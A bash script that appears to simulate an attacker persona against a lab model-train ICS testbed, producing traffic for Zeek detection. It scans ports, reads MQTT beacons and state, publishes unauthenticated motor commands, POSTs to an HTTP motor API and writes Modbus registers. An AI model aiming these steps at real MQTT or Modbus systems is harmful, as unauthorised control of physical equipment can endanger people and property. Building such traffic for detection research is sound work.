#!/usr/bin/env bash
# CT 213 — THE ONE WHO GETS IT
#
# Reads the room. Finds the discovery beacon. Understands the protocol.
# Sends valid commands. The train actually responds.
# Methodical but decisive — recon → understand → act → clean up.
#
# Zeek signature: nmap scan, mqtt_subscribe to discovery, mqtt_publish to
# correct cmd/ topics with valid JSON, modbus writes within valid register
# range, HTTP POST to /api/motor. The full attack chain, done right.

set -uo pipefail

TARGET="${TARGET_HOST:-192.168.1.200}"
BROKER="${TARGET}"
WEB="${TARGET}"
CONTROLLER="${TARGET}"
TRAIN="${TRAIN:-t1}"
PYENV="/opt/persona-env/bin/python3"

# Identifies itself — reads the discovery beacon, uses a proper client ID
MQTT_CLIENT_ID="attacker-$(hostname)-$$"
UA_PAHO="paho-mqtt/2.1.0 (Python 3.12)"

log() { echo "[the-one $(date +%H:%M:%S)] $*"; }
rnd() { python3 -c "import random; print(round(random.uniform($1,$2),1))"; }
rsleep() { sleep "$(rnd "$1" "$2")"; }

log "The One starting — target $TARGET"

while true; do
    log "=== New engagement ==="

    # Step 1: Quick targeted scan — only the ports that matter for ICS/IoT
    log "Step 1: Targeted port scan"
    nmap -sT -p 1883,5020,8000,9001 "$TARGET" --source-port 55555 2>/dev/null \
        | grep -E "open|closed" || true
    rsleep 2 4

    # Step 2: Read the web UI — understand what you're attacking
    log "Step 2: Fingerprint the web app"
    curl -s -A "$UA_PAHO" "http://${WEB}:8000/" 2>/dev/null | grep -oE 'PROTOCOL|MQTT|Modbus|train' | head -5 || true
    curl -s -A "$UA_PAHO" "http://${WEB}:8000/api/state" 2>/dev/null | python3 -m json.tool 2>/dev/null || true
    rsleep 2 3

    # Step 3: MQTT recon — read the discovery beacon first (named client ID)
    log "Step 3: Reading MQTT discovery beacon"
    DISCOVERY=$(timeout 8 mosquitto_sub -h "$BROKER" -p 1883 \
        -i "${MQTT_CLIENT_ID}-sub" \
        -t "choochoo/train/${TRAIN}/discovery" -C 1 2>/dev/null || true)
    if [ -n "$DISCOVERY" ]; then
        log "  Got beacon: $DISCOVERY"
    fi
    rsleep 1 2

    # Step 4: Subscribe to state — understand the current train condition
    log "Step 4: Reading train state"
    STATE=$(timeout 8 mosquitto_sub -h "$BROKER" -p 1883 \
        -i "${MQTT_CLIENT_ID}-state" \
        -t "choochoo/train/${TRAIN}/state" -C 1 2>/dev/null || true)
    if [ -n "$STATE" ]; then
        log "  Current state: $STATE"
    fi
    rsleep 1 2

    # Detect active protocol
    PROTOCOL=$(curl -s -A "$UA_PAHO" "http://${WEB}:8000/api/state" 2>/dev/null \
        | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('protocol','mqtt'))" 2>/dev/null || echo "mqtt")
    log "  Detected protocol: $PROTOCOL"

    if [ "$PROTOCOL" = "mqtt" ]; then
        # Step 5: MQTT motor commands (only valid in mqtt mode)
        log "Step 5: Sending MQTT motor command"
        mosquitto_pub -h "$BROKER" -p 1883 \
            -i "${MQTT_CLIENT_ID}-pub" \
            -t "choochoo/train/${TRAIN}/cmd/motor" \
            -m '{"power": 60, "direction": "forward"}' 2>/dev/null || true
        log "  Sent: power=60 forward"
        rsleep 5 10

        mosquitto_pub -h "$BROKER" -p 1883 \
            -i "${MQTT_CLIENT_ID}-pub" \
            -t "choochoo/train/${TRAIN}/cmd/motor" \
            -m '{"power": 30, "direction": "forward"}' 2>/dev/null || true
        log "  Throttled down to power=30"
        rsleep 3 6

        mosquitto_pub -h "$BROKER" -p 1883 \
            -i "${MQTT_CLIENT_ID}-pub" \
            -t "choochoo/train/${TRAIN}/cmd/motor" \
            -m '{"power": 40, "direction": "reverse"}' 2>/dev/null || true
        log "  Sent: power=40 reverse"
        rsleep 3 5

        mosquitto_pub -h "$BROKER" -p 1883 \
            -i "${MQTT_CLIENT_ID}-pub" \
            -t "choochoo/train/${TRAIN}/cmd/stop" \
            -m '{}' 2>/dev/null || true
        log "  Stopped train via cmd/stop"
        rsleep 2 4

        # Step 6: HTTP API (mqtt mode only — in modbus mode this would stop the train)
        log "Step 6: HTTP API takeover (mqtt mode)"
        curl -s -A "$UA_PAHO" -X POST "http://${WEB}:8000/api/motor" \
            -H "Content-Type: application/json" \
            -d '{"power": 50, "direction": "forward"}' 2>/dev/null | python3 -m json.tool 2>/dev/null || true
        rsleep 3 5
        curl -s -A "$UA_PAHO" -X POST "http://${WEB}:8000/api/stop" \
            -H "Content-Type: application/json" -d '{}' 2>/dev/null || true
        log "  HTTP stop sent"
        rsleep 2 3
    else
        log "Step 5-6: Skipping MQTT/HTTP commands (protocol=$PROTOCOL — Modbus mode)"
        rsleep 2 4
    fi

    # Step 7: Modbus — enumerate then write
    log "Step 7: Modbus register attack"
    $PYENV - <<PY 2>/dev/null || true
import asyncio
from pymodbus.client import AsyncModbusTcpClient

async def go():
    c = AsyncModbusTcpClient("${CONTROLLER}", port=5020)
    try:
        if not await c.connect():
            print("Modbus: no connection")
            return

        # Read first to understand the register map
        hr = await c.read_holding_registers(0, count=4)
        ir = await c.read_input_registers(0, count=2)
        if not hr.isError():
            print(f"  HR[0:4] = {hr.registers}  (index 0 = power setpoint)")
        if not ir.isError():
            print(f"  IR[0:2] = {ir.registers}  (index 1 = MAX_POWER)")

        max_power = 50
        if not ir.isError() and len(ir.registers) > 1:
            max_power = ir.registers[1]

        # Write motor power at 70% of max
        target = int(max_power * 0.7)
        r = await c.write_register(0, target)
        print(f"  Write HR[0]={target}: {'ok' if not r.isError() else 'error'}")
        await asyncio.sleep(4)

        # Clean stop
        r = await c.write_register(0, 0)
        print(f"  Write HR[0]=0 (stop): {'ok' if not r.isError() else 'error'}")
    finally:
        c.close()

asyncio.run(go())
PY
    rsleep 3 5

    log "=== Engagement complete — mission accomplished ==="
    rsleep 90 180
done
